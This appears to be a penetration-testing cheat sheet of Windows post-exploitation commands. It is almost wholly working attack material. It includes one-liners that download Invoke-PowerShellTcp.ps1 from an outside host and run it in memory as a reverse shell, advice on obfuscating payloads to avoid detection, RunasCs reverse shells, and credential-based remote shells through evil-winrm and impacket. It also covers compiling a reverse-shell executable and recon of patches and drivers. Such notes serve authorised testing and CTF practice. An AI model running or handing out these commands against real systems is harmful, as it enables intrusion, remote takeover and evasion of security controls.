# Run Invoke-PowerShellTcp in memory without saving to disk
```bash
: '
Dowload and utilize [Chimera](https://github.com/tokyoneon/Chimera/tree/master) to obfuscate the reverse shell 
'

# CMD 
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1') | powershell -noprofile -

# PowerShell 
(New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1') | IEX

```

# Run PowerUp on Windows 10/2019 and before
```bash
: '
Modify PowerUp script to call Invoke-AllChecks function in global namespace (Place call to function at end of file)
Dowload and utilize [powerob](https://github.com/tokyoneon/Chimera/tree/master) to obfuscate PowerUp
Run PowerUp via CMD or PowerShell commands shown for Invoke-PowerShellTcp.ps1
'
``` 

# PowerShell - Sudo 
```bash
: ' 
[RunasCs](https://github.com/antonioCoco/RunasCs)
'
# Evil-WinRM  
upload RunasCs.exe
.\RunasCs.exe user password powershell.exe -r 10.10.10.10:1234

# PowerShell
curl http://10.10.10.10/RunasCs.exe -o runas.exe
.\runas.exe user password powershell.exe -r 10.10.10.10:1234
```

# Login to Windows
```bash
# Obtain shell via RDP
rdesktop -u username -p password -g 85% 10.10.10.10

# Obtain powershell session via WinRM 
sudo evil-winrm -u '<username>' -p '<password>' -i 10.10.10.10

# Obtain shell via SMB 
sudo python3 /usr/share/doc/python3-impacket/examples/smbexec.py <Domain>/<username>:<password>@10.10.10.10

# Execute cmd.exe over named pipe with SMB
sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py <Domain>/<username>:<password>@10.10.10.10 cmd

# Obtain shell via WMI
sudo python3 /usr/share/doc/python3-impacket/examples/wmiexec.py <Domain>/<username>:<password>@10.10.10.10
```

# Compile C# code on Windows 
```bash
: 'find csc compiler and compile code
'
# CMD  
dir /s %WINDIR%\CSC.EXE
C:\windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:exe /out:c:\windows\temp\rev.exe "c:\HP Universal Print Driver\rev.cs"
```

# Get Processor Architecture and Windows OS Version 
```bash
# CMD  
echo %PROCESSOR_ARCHITECTURE% 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" || ver # If systeminfo blocked, get OS version

# PowerShell 
$env:PROCESSOR_ARCHITECTURE
Get-ComputerInfo | select WindowsBuildLabEx, WindowsInstallationType, WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
[Environment]::OSVersion # If Get-ComputerInfo blocked, get OS version
```

# Get Security Patches and Third-Party Drivers 
```bash
# CMD  
systeminfo | findstr /I KB
for /f "tokens=1,2 delims=," %A in ('driverquery /v /fo csv ^| findstr /v /i "microsoft"') do @echo Process Name: %A, Display Name: %B

# PowerShell 
Get-Hotfix -description "Security update" 
$drivers = Get-CimInstance Win32_SystemDriver | Where-Object { $_.DisplayName -notlike "*Microsoft*" }
$drivers | Select-Object DisplayName, PathName | Format-Table -AutoSize
```
